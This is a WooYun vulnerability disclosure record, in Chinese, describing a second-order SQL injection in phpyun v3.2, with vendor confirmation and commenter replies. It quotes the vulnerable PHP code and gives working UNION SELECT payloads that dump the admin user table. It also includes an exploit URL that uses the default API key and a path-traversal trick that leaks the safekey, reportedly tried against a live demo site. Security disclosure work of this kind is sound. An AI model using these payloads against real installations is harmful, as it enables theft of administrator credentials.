{"id": 45017, "wybug_id": "wooyun-2015-089069", "wybug_title": "phpyun v3.2 二次注入一枚(绕过过滤,无需登录)", "wybug_corp": "php云人才系统", "wybug_author": "′雨。", "wybug_date": "2015-01-04 10:47", "wybug_open_date": "2015-04-04 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向公众公开  简要描述： 20141226的对之前的绕过过滤的那里也稍微改了下。。 这个改了 依旧能直接绕过 无限制。可以直接出管理的密码啥的。 本地直接出管理密码了,demo测试。。 因为demo有安全狗。不会搞安全狗。 就直接延个时了。。 详细说明：  http://www.hr135.com/company/index.php?m=index&c=index&id=3751&style=../../template/admin&tp=/admin_web_config可以发现现在打开是空白了。。 来看看代码。在conpany/model/index.class.php中\n$_GET['style'] = str_replace(array('.','/'),'',$_GET['style']);//原来是过滤了. 和 /\t\tif($row['comtpl'] && $row['comtpl']!=\"default\" && !$_GET['style']){\t\t\t$tplurl=$row[comtpl];\t\t\t$this->registrs();\t\t}else{\t\t\t$tplurl=\"default\";\t\t}\t\tif($_GET['style']){\t\t\t$tplurl=$_GET['style'];\t\t}\t\t$tp=$_GET['tp']?$_GET['tp']:\"index\";\t\t$this->public_action();\t\t$this->yunset(\"msglist\",$msglist);\t\t$this->yunset(\"usertype\",$_COOKIE['usertype']);\t\t$this->yunset(\"uid\",$this->uid);\t\t$this->yunset(\"comclass_name\",$comclass_name);\t\t$this->yunset(\"com\",$row);\t\t$this->yunset(\"looktype\",$looktype);\t\t$this->yunset(\"look_msg\",$look_msg);\t\t$this->seo(\"company_\".$tp);\t\t$this->yunset(\"com_style\",$this->config['sy_weburl'].\"/template/company/\".$tplurl.\"/\");\t\t$this->yunset(\"comstyle\",\"../template/company/\".$tplurl.\"/\");\t\t$this->yuntpl(array('company/'.$tplurl.\"/\".$tp));//不过我不怕 我还有$tp\n那么就继续绕过过滤进行注入。请无视上面的。这个是之前的了， 但是还是有点问题的是。发现phpyun生成的safekey都是一样的。我测试了一些站 发现很少有改的。之前连demo也没改。后面被我注入了几次才改了。推荐随机生成一个呗。 咱我记得以前都是随机的。现在都是啥72**啥的。 rand在api\\locoy\\model\\news.class.php中\nfunction addnews_action(){\t\tinclude(\"locoy_config.php\");\t\tif($locoyinfo['locoy_online']!=1){ //默认都为1\t\t\techo 4;die;\t\t}\t\tif($locoyinfo['locoy_key']!=trim($_GET['key'])){//默认为phpyun 基本没改的。\t\t\techo 5;die;\t\t}        if(!$_POST['title'] || !$_POST['content'] || !$_POST['nid']){\t\t\techo 2;die;\t\t}\t\t$row=$this->obj->DB_select_once(\"news_base\",\"`title`='\".trim($_POST['title']).\"' and `nid`='\".$_POST['nid'].\"'\");//查询是否重复。，\t\tif(is_array($row)){\t\t\techo 3;die;\t\t}\t\t$value=\"\";        $value.=\"`title`='\".trim($_POST['title']).\"',\";\t\t$value.=\"`nid`='\".$_POST['nid'].\"',\";\t\t$value.=\"`author`='\".$_POST['author'].\"',\";\t\t$value.=\"`description`='\".$_POST['description'].\"',\";\t\t$value.=\"`source`='\".$_POST['source'].\"'\";\t\tif($_POST['ctime']){\t\t\t$value.=\",`datetime`='\".strtotime($_POST['ctime']).\"'\";\t\t}else{\t\t\t$value.=\",`datetime`='\".time().\"'\";\t\t}\t\tif($_POST['hits']){\t\t\t$value.=\",`hits`='\".trim($_POST['hits']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_rand']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`hits`='\".$rand.\"'\";\t\t}\t\tif($_POST['sort']){\t\t\t$value.=\",`sort`='\".trim($_POST['sort']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_sort']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`sort`='\".$rand.\"'\";\t\t}\t\tif($_POST['newsphoto']){\t\t\t$value.=\",`newsphoto`='\".trim($_POST['newsphoto']).\"'\";\t\t}\t\tif($_POST['s_thumb']){\t\t\t$value.=\",`s_thumb`='\".trim($_POST['s_thumb']).\"'\";\t\t}\t\t$content=$_POST['content'];       if(!$_POST['keyword'] && $locoyinfo['locoy_keyword']==1){\t\t\trequire(APP_PATH.\"/include/lib_splitword_class.php\");\t\t\t$sp = new SplitWord();\t\t\t$keywordarr=$sp->getkeyword(strip_tags($content));\t\t\t$value.=\",`keyword`='\".@implode(\",\",$keywordarr).\"'\";\t\t}elseif($_POST['keyword']){\t\t\t$value.=\",`keyword`='\".str_replace(\"，\",\",\",$_POST['keyword']).\"'\";//点点点\t\t}\t     \t$new_base = $this->obj->DB_insert_once(\"news_base\",$value);//入库了        $news_content = $this->obj->DB_insert_once(\"news_content\", \"`nbid`='$new_base',`content`='$content'\");\t\tif($new_base){\t\t\techo 1;die;\n在model/news.class.php中\nfunction show_action()\t{\t\t$id=(int)$_GET['id'];\t\t$news=$this->obj->DB_select_once(\"news_base\",\"`id`='\".$id.\"'\");//这里出库了。\t\t$row=$this->obj->DB_select_once(\"news_content\",\"`nbid`='\".$id.\"'\");\t\t$news['content']=$row['content'];\t\t$news_last=$this->obj->DB_select_once(\"news_base\",\"`id`<'\".$id.\"' order by `id` desc\");\t\tif(!empty($news_last)){ \t\t\tif($this->config[sy_news_rewrite]==\"2\"){\t\t\t\t$news_last[\"url\"]=$this->config['sy_weburl'].\"/news/\".date(\"Ymd\",$news_last[\"datetime\"]).\"/\".$news_last['id'].\".html\";\t\t\t}else{\t\t\t\t$news_last[\"url\"]= $this->Url(\"index\",'news',array('c'=>'show',\"id\"=>$news_last[id]),\"1\"); \t\t\t}\t\t}\t\t$news_next=$this->obj->DB_select_once(\"news_base\",\"`id`>'\".$id.\"' order by `id` asc\");\t\tif(!empty($news_next)){\t\t\tif($this->config[sy_news_rewrite]==\"2\"){\t\t\t\t$news_next[\"url\"]=$this->config['sy_weburl'].\"/news/\".date(\"Ymd\",$news_next[\"datetime\"]).\"/\".$news_next['id'].\".html\";\t\t\t}else{\t\t\t\t$news_next[\"url\"]= $this->Url(\"index\",'news',array('c'=>'show',\"id\"=>$news_next[id]),\"1\"); \t\t\t} \t\t}\t\t$class=$this->obj->DB_select_once(\"news_group\",\"`id`='\".$news['nid'].\"'\");\t\t\tif($news[0][\"keyword\"]!=\"\")//如果查询出来的关键字不为空\t\t{\t\t\t\t\t$keyarr = @explode(\",\",$news[\"keyword\"]);//这里用逗号来切割关键字。 那么意味着不能使用逗号了。\t\t\tif(is_array($keyarr) && !empty($keyarr))\t\t\t{\t\t\t\tforeach($keyarr as $key=>$value)\t\t\t\t{\t\t\t\t\t$sqlkeyword[]= \" `keyword` LIKE '%$value%'\";//把查询出来的又拼接进来了, 那么意味着可以引入单引号了。\t\t\t\t}\t\t\t\t$sqlkw = @implode(\"OR\",$sqlkeyword);\t\t\t\t$about=$this->obj->DB_select_all(\"news_base\",\" 1 AND  ($sqlkw) AND `id`<>'\".$id.\"' order by `id` desc limit 6\");//查询\t\t\t\tif(is_array($about)){\t\t\t\t\tforeach($about as $k=>$v){\t\t\t\t\t\tif($this->config[sy_news_rewrite]==\"2\"){\t\t\t\t\t\t\t$about[$k][\"url\"]=$this->config['sy_weburl'].\"/news/\".date(\"Ymd\",$v[\"datetime\"]).\"/\".$v['id'].\".html\";\t\t\t\t\t\t}else{\t\t\t\t\t\t\t$about[$k][\"url\"]= $this->Url(\"index\",'news',array('c'=>'show',\"id\"=>$v[id]),\"1\"); \t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\t$info=$news;\t\t$data['news_title']=$news['title'];\t\t$data['news_keyword']=$news['keyword'];\t\t$data['news_author']=$news['author'];\t\t$data['news_source']=$news['source'];\t\t$data['news_class']=$class['name'];\t\t\t$data['news_desc']=$this->obj->GET_content_desc($news['description']);\t\t$this->data=$data;\t\t$info[\"news_class\"]=$class['name'];\t\t$info[\"last\"]=$news_last;\t\t$info[\"next\"]=$news_next;\t\t$info[\"like\"]=$about;\t\t\t\t$this->yunset(\"Info\",$info);//这里直接回显出来。\n因为是二次注入 如果使用盲注的话 二次注入会非常的麻烦。所以还是要想办法联合查询。 然后构造一下 因为主语句中有16个列 所以要16个。%') and 1=2 UNION SELECT * FROM  ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN(SELECT 4)d JOIN (SELECT 5)e JOIN (SELECT 6)f JOIN (SELECT 7)g JOIN (SELECT 8)h JOIN (SELECT 9)i JOIN (SELECT 10)j JOIN (SELECT 11)k JOIN (SELECT 12)l JOIN (SELECT 13)m JOIN (SELECT 14)n JOIN (SELECT 15)o JOIN (a 16)p)#后面发现 数据库没存储完。| keyword     | varchar(200) | NO   |     | NULL    |去看了下数据库 才发现keyword这个列只能储存200个字符 但是我们上面那个语句都已经300了。。 所以要想办法缩短到200.后面我看了一下管理表 phpyun_admin_user 有8个列。那我们再构造一下') and 1=2 union select * from phpyun_admin_user join (select 1)a join (select 2)b join (select 2)c join (select 3)d join (select 4) e join(select 5)f join(select 6)g join (select 7)o join(select 8)p#\nmysql> select length('\\') and 1=2 union select * from phpyun_admin_user join (select 1)a join (select 2)b join (select 2)c join (select 3)d join (select 4) e join(select 5)f join(select 6)g join (select 7)o join(select 8)p#');+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| length('\\') and 1=2 union select * from phpyun_admin_user join (select 1)a join (select 2)b join (select 2)c join (select 3)d join (select 4) e join(select 5)f join(select 6)g join (select 7)o join(select 8)p#') |+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+|                                                  200 |\n我勒个擦 这运气也太好了把。。 刚好200个字符。。然后来测试。http://web/web/phpyun1226/api/locoy/index.php/admin/?m=news&c=addnews&key=phpyuntitle=xa&content=xxax&nid=555&keyword=') and 1=2 union select * from phpyun_admin_user join (select 1)a join (select 2)b join (select 2)c join (select 3)d join (select 4) e join(select 5)f join(select 6)g join (select 7)o join(select 8)p#&safekey=939ab244bfc16c6013fadef6e6ecc702\n\n返回1 添加成功。然后访问 最后一个id的新闻 这里我们只需要把id写得很大http://web/web/phpyun1226/index.php?m=news&c=show&id=21然后会提示上一个新闻 点进去 就是我们的新闻了。\n\n直接出数据。。  这里再用demo演示一下。\n\n这里看到被拦截了 这里我们拿一下safekeyhttp://www.hr135.com/company/index.php?m=index&c=index&id=3751&style=index&tp=../../../template/admin/admin_web_config这样绕过过滤 直接拿safekey然后计算一下safekey\n\n可以看到用计算出来的saefkey 又绕过了过滤。。但是我过不了demo的安全狗 我擦擦擦擦擦。 这里我延时一个把。\n\n返回1添加成功。http://www.hr135.com/index.php?m=news&c=show&id=457 //延时了的http://www.hr135.com/index.php?m=news&c=show&id=450 //普通的可以发现明显时间不同。。    漏洞证明：  \n\n   修复方案：  出库过滤。   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-06 14:08 厂商回复： 感谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-04 11:10 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  雨神啥时候高考？    \n     2015-01-04 11:22 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n   我擦。。 没搞错吧，，  这个是很久以前的了。。  当时没审核，  现在都修复了 现在通过。。@Finger    \n     2015-01-04 11:22 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @px1624  今年。    \n     2015-01-04 11:27 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @′雨。 那还不好好学习，还来挖洞。这是已经被报送了的节奏么    \n     2015-01-04 11:30 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @px1624   这是好久前的了，:-(   妈蛋 刚破400的学渣。    \n     2015-01-04 11:32 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @′雨。 很久以前？显示的提交时间是今天啊    \n     2015-01-04 11:33 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n     用爪机敲了几个字上去。。  来帮忙更新下  @Finger  @疯狗  么么哒。    \n     2015-01-07 17:39 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @px1624   之前提交的， 现在过审核嘛。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}